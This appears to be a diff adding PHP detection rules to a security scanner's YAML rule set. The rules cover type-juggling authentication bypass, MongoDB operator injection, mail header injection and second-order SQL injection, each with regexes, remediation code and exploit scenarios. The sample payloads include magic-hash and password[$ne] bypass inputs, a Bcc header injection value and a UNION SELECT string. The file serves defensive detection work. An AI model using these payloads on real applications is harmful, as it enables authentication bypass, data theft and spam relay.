+    pattern: (?:\$(?:stored|expected|hash|password|token|db|correct|valid)|[a-zA-Z_]\w{0,30}\()\s*==\s*\$(?:_(?:GET|POST|REQUEST|COOKIE)|input|password|token|key|secret)\b
+    description: Loose comparison of security value with user input (reversed)
+  - type: regex
+    pattern: strcmp\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|password|token)\b[^)]*\)\s*==\s*0
+    description: strcmp bypass via array injection (returns NULL == 0)
+  - type: regex
+    pattern: md5\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|password)\b[^)]*\)\s*==\s*["']0e\d+
+    description: MD5 magic hash comparison (0e... == 0)
+  - type: regex
+    pattern: hash\s*\(\s*["'](?:md5|sha1|sha256)["'][^)]*\$(?:_(?:GET|POST|REQUEST)|input|password)\b[^)]*\)\s*==\s*
+    description: Hash comparison with loose equality
+  anti_patterns:
+  - ===
+  - '!=='
+  - hash_equals(
+  - password_verify(
+  - sodium_crypto
+  - strict comparison
+  bypass_variants:
+  - description: Magic hash 0e462097431906509019562988736854
+    pattern: 0e\\d{30}
+  - description: Array vs string comparison
+    pattern: \\[\\]
+  evasion_indicators:
+  - PHP magic hashes (0e...)
+  - Array parameter injection for strcmp
+  - Integer string coercion
+  encoding_variants:
+  - type: php_type_coercion
+    pattern: 0e\\d+
+  multi_function_chain_patterns:
+  - $_POST['password'] -> md5($password) == $stored_hash
+  - $_POST['token'] -> strcmp($token, $valid_token) == 0
+  privilege_context_flags:
+    requires_auth_context: true
+    admin_only_risk: false
+    escalation_vector: Authentication bypass via type coercion
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $_POST['password'], $_POST['token']
+    sink: == comparison, strcmp()
+    through: Loose comparison operator
+  impact: 'Type juggling enables authentication bypass, HMAC verification bypass,
+
+    and API key comparison bypass. Magic hashes (0e...) compare as equal
+
+    to 0 with loose comparison. Array injection causes strcmp() to return
+
+    NULL which equals 0 with loose comparison.
+
+    '
+  remediation: "Always use strict comparison (===) for security values:\n\n  // UNSAFE: Loose comparison\n  if (md5($input) == $stored_hash) { /* bypassed */ }\n\n  // SAFE: Strict comparison\n  if (md5($input)\
+    \ === $stored_hash) { /* secure */ }\n\n  // SAFE: Use hash_equals for timing-safe comparison\n  if (hash_equals($stored_hash, md5($input))) { /* secure */ }\n\n  // SAFE: Use password_verify for passwords\n\
+    \  if (password_verify($input, $stored_hash)) { /* secure */ }\n\n  // UNSAFE: strcmp with array injection\n  if (strcmp($_POST['token'], $secret) == 0) { /* bypassed via ?token[]=x */ }\n\n  // SAFE:\
+    \ Type-check first\n  if (is_string($_POST['token']) && hash_equals($secret, $_POST['token'])) { /* secure */ }\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/843.html
+  - https://owasp.org/www-community/vulnerabilities/PHP_Magic_Tricks_Type_Juggling
+  context_awareness:
+    surrounding_context_patterns:
+    - md5(
+    - sha1(
+    - hash(
+    - strcmp(
+    - password
+    - token
+    - api_key
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $_COOKIE
+    - $request->input(
+    taint_sink_indicators:
+    - == $
+    - == '
+    - strcmp(
+    - == 0
+    sanitization_patterns:
+    - ===
+    - hash_equals(
+    - password_verify(
+    - is_string(
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * auth_context_factor
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'Login compares: if (md5($_POST[''password'']) == $db_hash).
+
+      Attacker sends password=240610708 which produces md5 hash starting
+
+      with 0e... matching another 0e... hash via loose comparison.
+
+      '
+    example_payload: '240610708'
+    attacker_objective: Bypass password authentication via PHP magic hash collision
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-003
+- rule_id: PHP-INJ-013
+  title: MongoDB NoSQL Injection via PHP Driver
+  description: 'Detects NoSQL injection where user-controlled input is passed to MongoDB queries via the PHP MongoDB driver or legacy mongo extension, enabling query operator injection and authentication
+    bypass.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-943
+  owasp: A03:2021-Injection
+  tags:
+  - nosql-injection
+  - mongodb
+  - authentication-bypass
+  - php
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: ->find(?:One)?\s*\(\s*\[\s*["'][^"']+["']\s*=>\s*\$(?:_(?:GET|POST|REQUEST)|input|param|user|username|search)\b
+    description: MongoDB find with user input in filter array
+  - type: regex
+    pattern: ->find(?:One)?\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|filter|query|criteria|where)\b
+    description: MongoDB find with user-controlled filter variable
+  - type: regex
+    pattern: \$(?:where|regex|gt|gte|lt|lte|ne|in|nin|or|and|not)\b.*\$(?:_(?:GET|POST|REQUEST)|input|param|user)\b
+    description: MongoDB operator with user-controlled value
+  - type: regex
+    pattern: json_decode\s*\([^)]*\$(?:_(?:GET|POST|REQUEST)|body|input)\b[^)]*\)[^;]*->find
+    description: JSON-decoded user input used as MongoDB filter
+  - type: regex
+    pattern: ->(?:updateOne|deleteOne|aggregate)\s*\(\s*(?:\$(?:_(?:GET|POST|REQUEST)|filter|query)|\[.*\$(?:_(?:GET|POST|REQUEST)|input))\b
+    description: MongoDB mutation with user-derived filter
+  anti_patterns:
+  - new ObjectId(
+  - MongoDB\BSON\ObjectId
+  - filter_var
+  - is_string
+  - intval(
+  - validate
+  - allowlist
+  bypass_variants:
+  - description: Operator injection via JSON body
+    pattern: '\\$(?:gt|ne|regex).*:'
+  - description: $where JavaScript injection
+    pattern: \\$where.*function
+  evasion_indicators:
+  - MongoDB operator injection via array params
+  - $where JS execution
+  - Regex operator injection
+  encoding_variants:
+  - type: php_array
+    pattern: \\[\\$(?:gt|ne|regex)\\]
+  multi_function_chain_patterns:
+  - $_POST -> json_decode -> $collection->findOne($filter)
+  - $_POST['user'] -> ['username' => $user] -> findOne()
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Authentication bypass via operator injection
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $_POST, json_decode(php://input)
+    sink: $collection->findOne(), $collection->find()
+    through: Array parameter injection or JSON body as filter
+  impact: 'NoSQL injection enables authentication bypass, data exfiltration,
+
+    and server-side JavaScript execution via $where operator. PHP''s
+
+    array parameter handling makes operator injection straightforward.
+
+    '
+  remediation: "Validate input types strictly. Never pass raw arrays as filters:\n\n  // UNSAFE: Direct user input as filter value\n  $collection->findOne(['username' => $_POST['user'], 'password' => $_POST['pass']]);\n\
+    \  // Bypassed with: password[$ne]=x\n\n  // SAFE: Type-cast and validate\n  $user = (string)$_POST['user'];\n  $pass = (string)$_POST['pass'];\n  if (!is_string($user) || !is_string($pass)) { throw\
+    \ new Exception('Invalid'); }\n  $collection->findOne(['username' => $user, 'password' => password_hash($pass)]);\n\nLaravel/Jenssegers: Use Eloquent model methods with validated input.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/943.html
+  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+  context_awareness:
+    surrounding_context_patterns:
+    - MongoDB\\Collection
+    - MongoDB\\Client
+    - MongoCollection
+    - $collection->
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - json_decode(
+    - $request->input(
+    taint_sink_indicators:
+    - ->findOne(
+    - ->find(
+    - ->aggregate(
+    - ->updateOne(
+    - ->deleteOne(
+    sanitization_patterns:
+    - new ObjectId(
+    - is_string(
+    - intval(
+    - filter_var(
+    - validate
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - validation_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'Login: $collection->findOne([''user'' => $_POST[''user''], ''pass'' => $_POST[''pass'']]).
+
+      Attacker sends pass[$ne]=x to bypass authentication via operator injection.
+
+      '
+    example_payload: username=admin&password[$ne]=anything
+    attacker_objective: Bypass authentication via MongoDB operator injection
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-007
+- rule_id: PHP-INJ-014
+  title: Mail Header Injection via mail()/PHPMailer
+  description: 'Detects email header injection where user-controlled input is passed to mail() headers, PHPMailer, or SwiftMailer recipients without proper validation, enabling spam relay, BCC injection,
+    and content manipulation.
+
+    '
+  language: php
+  category: injection
+  severity: Medium
+  confidence: 0.86
+  cwe: CWE-93
+  owasp: A03:2021-Injection
+  tags:
+  - mail-injection
+  - header-injection
+  - spam-relay
+  - php
+  detection_layer: 2
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: mail\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|to|email|recipient|input)\b
+    description: mail() with user-controlled recipient
+  - type: regex
+    pattern: mail\s*\(\s*[^,]*,\s*[^,]*,\s*[^,]*,\s*[^)]*\$(?:_(?:GET|POST|REQUEST)|input|from|subject|headers)\b
+    description: mail() with user-controlled additional headers
+  - type: regex
+    pattern: (?:From|Cc|Bcc|Reply-To):\s*["']?\s*\.\s*\$(?:_(?:GET|POST|REQUEST)|input|email|from|user)\b
+    description: Email header built with concatenated user input
+  - type: regex
+    pattern: ->(?:setFrom|addAddress|addCC|addBCC|addReplyTo)\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|email|from|user)\b
+    description: PHPMailer method with user-controlled email address
+  - type: regex
+    pattern: sprintf\s*\(\s*["'](?:From|Cc|Bcc|Reply-To):\s*%s["'][^)]*\$(?:_(?:GET|POST|REQUEST)|input|email|from|user)\b
+    description: Email header via sprintf with user input
+  anti_patterns:
+  - filter_var.*FILTER_VALIDATE_EMAIL
+  - FILTER_SANITIZE_EMAIL
+  - idn_to_ascii
+  - preg_match.*@
+  - PHPMailer::validateAddress
+  - SwiftMailer
+  bypass_variants:
+  - description: Newline injection in headers
+    pattern: '%0[aAdD]|\\\\r|\\\\n'
+  - description: Header injection via To field
+    pattern: 'user@example\\.com%0aBcc:'
+  evasion_indicators:
+  - Newline injection in email fields
+  - BCC header injection
+  - Subject header injection
+  encoding_variants:
+  - type: url_encoding
+    pattern: '%0[aAdD]'
+  multi_function_chain_patterns:
+  - $_POST['email'] -> mail($email, $subject, $body)
+  - '$_POST[''from''] -> ''From: '' . $from -> mail($to, $subj, $body, $headers)'
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Spam relay and phishing via injected headers
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: false
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $_POST['email'], $_POST['from']
+    sink: mail(), PHPMailer::addAddress()
+    through: Direct or header-concatenated user input
+  impact: 'Mail header injection enables spam relay (sending to arbitrary
+
+    recipients via BCC injection), phishing via spoofed From headers,
+
+    and content manipulation via injected Subject/Content-Type headers.
+
+    '
+  remediation: "Validate email addresses and strip newlines:\n\n  // SAFE: Validate email format\n  $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);\n  if ($email === false) { throw new Exception('Invalid\
+    \ email'); }\n\n  // SAFE: Strip CRLF from all header values\n  $from = str_replace([\"\\r\", \"\\n\"], '', $_POST['from']);\n\n  // SAFE: Use PHPMailer with validation\n  $mail = new PHPMailer(true);\n\
+    \  $mail->setFrom($validated_email); // PHPMailer validates\n\nLaravel: Use Mail facade which handles validation internally.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/93.html
+  - https://owasp.org/www-community/attacks/Email_Header_Injection
+  context_awareness:
+    surrounding_context_patterns:
+    - mail(
+    - PHPMailer
+    - SwiftMailer
+    - setFrom(
+    - addAddress(
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $request->input(
+    taint_sink_indicators:
+    - mail(
+    - ->setFrom(
+    - ->addAddress(
+    - ->addCC(
+    - ->addBCC(
+    sanitization_patterns:
+    - FILTER_VALIDATE_EMAIL
+    - FILTER_SANITIZE_EMAIL
+    - PHPMailer::validateAddress
+  severity_scoring:
+    severity_weight: 6
+    risk_score_formula_hint: severity_weight * confidence * spam_relay_risk
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'Contact form: mail($_POST[''to''], $subj, $body, "From: " . $_POST[''email'']).
+
+      Attacker sends email=attacker@evil.com%0aBcc:victim1@x.com,victim2@x.com.
+
+      '
+    example_payload: 'attacker@evil.com\r\nBcc: victim@target.com'
+    attacker_objective: Use server as spam relay via BCC header injection
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: simple
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: false
+    high_impact_flag: false
+    related_rules:
+    - PHP-INJ-011
+    - PHP-INJ-002
+- rule_id: PHP-INJ-015
+  title: Second-Order SQL Injection via Stored Data
+  description: 'Detects second-order SQL injection where previously stored data (database records, session values, file contents) is used in SQL queries without parameterization. The initial storage may
+    be safe but subsequent use in queries creates injection opportunities.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.8
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - second-order
+  - stored-data
+  - php
+  detection_layer: 3
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: (?:query|exec|prepare)\s*\(\s*["'](?:SELECT|INSERT|UPDATE|DELETE)\b[^"']*["']?\s*\.\s*\$(?:row|result|record|data|user|profile|settings)\b\[
+    description: SQL query with concatenated database result column
+  - type: regex
+    pattern: (?:query|exec)\s*\(\s*["'](?:SELECT|INSERT|UPDATE|DELETE)\b[^"']*["']?\s*\.\s*\$_SESSION\b\[
+    description: SQL query with concatenated session value
+  - type: regex
+    pattern: sprintf\s*\(\s*["'](?:SELECT|INSERT|UPDATE|DELETE)\b[^"']*%s[^"']*["']\s*,\s*\$(?:row|result|record|data)\b\[
+    description: SQL via sprintf with stored data column
+  - type: regex
+    pattern: \$(?:username|name|email|title|value)\s*=\s*\$(?:row|result|record)\b\[["'][^"']*["']\][^;]*\n[^;]*(?:query|exec)\s*\(\s*["'][^"']*["']?\s*\.\s*\$(?:username|name|email|title|value)\b
+    description: Variable from DB result used in subsequent query concatenation
+  - type: regex
+    pattern: ->(?:where|whereRaw|havingRaw|orderByRaw)\s*\(\s*[^)]*\$(?:row|result|record|data|stored)\b\[
+    description: Laravel raw query method with stored data
+  anti_patterns:
+  - ->where(
+  - PDO::prepare
+  - bindParam
+  - bindValue
+  - parameterized
+  - prepared statement
+  - Eloquent
+  bypass_variants:
+  - description: Stored XSS escalating to SQLi
+    pattern: htmlspecialchars.*query
+  - description: Cache-based injection
+    pattern: cache.*get.*query
+  evasion_indicators:
+  - Data stored safely then used unsafely
+  - Cross-request injection
+  - Cache-based payload delivery
+  encoding_variants:
+  - type: stored_payload
+    pattern: admin''--
+  multi_function_chain_patterns:
+  - INSERT (parameterized) -> SELECT row -> query('...' . $row['name'])
+  - $_SESSION['user'] = $input -> query('...' . $_SESSION['user'])
+  privilege_context_flags:
+    requires_auth_context: true
+    admin_only_risk: false
+    escalation_vector: SQLi via previously stored malicious data
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Database query results, $_SESSION, cache values
+    sink: mysqli_query(), PDO::exec(), ->whereRaw()
+    through: Stored data treated as trusted in subsequent queries
+  impact: 'Second-order SQL injection is particularly dangerous because it
+
+    bypasses input validation at the storage point. The payload persists
+
+    in the database and triggers when the stored data is used in
+
+    subsequent queries, potentially across different application components.
+
+    '
+  remediation: "Always use parameterized queries, even for stored data:\n\n  // UNSAFE: Stored data in query concatenation\n  $name = $row['username'];\n  $db->query(\"SELECT * FROM orders WHERE customer\
+    \ = '$name'\");\n\n  // SAFE: Parameterized even for stored data\n  $stmt = $db->prepare(\"SELECT * FROM orders WHERE customer = ?\");\n  $stmt->execute([$row['username']]);\n\n  // SAFE: Laravel Eloquent\
+    \ (auto-parameterized)\n  Order::where('customer', $row['username'])->get();\n\n  // UNSAFE: Laravel raw query with stored data\n  DB::select(\"SELECT * FROM orders WHERE customer = '{$row['username']}'\"\
+    );\n\nTreat ALL data as untrusted, regardless of source.\nUse parameterized queries everywhere, not just at input boundaries.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  context_awareness:
+    surrounding_context_patterns:
+    - mysqli_query(
+    - PDO::exec(
+    - ->query(
+    - ->whereRaw(
+    taint_source_indicators:
+    - $row[
+    - $result[
+    - $record[
+    - $_SESSION[
+    - $data[
+    taint_sink_indicators:
+    - query(
+    - exec(
+    - ->whereRaw(
+    - ->havingRaw(
+    - ->orderByRaw(
+    sanitization_patterns:
+    - prepare(
+    - bindParam(
+    - bindValue(
+    - ->where(
+    - Eloquent
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * stored_data_trust_factor
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'User registers with username: admin''-- (safely stored via prepared statement).
+
+      Admin panel displays user list: query("SELECT * FROM logs WHERE user = ''$username''").
+
+      The stored payload triggers SQL injection in the admin context.
+
+      '
+    example_payload: admin' UNION SELECT password FROM users--
+    attacker_objective: Inject SQL via stored malicious data in privileged context
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: complex
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-003
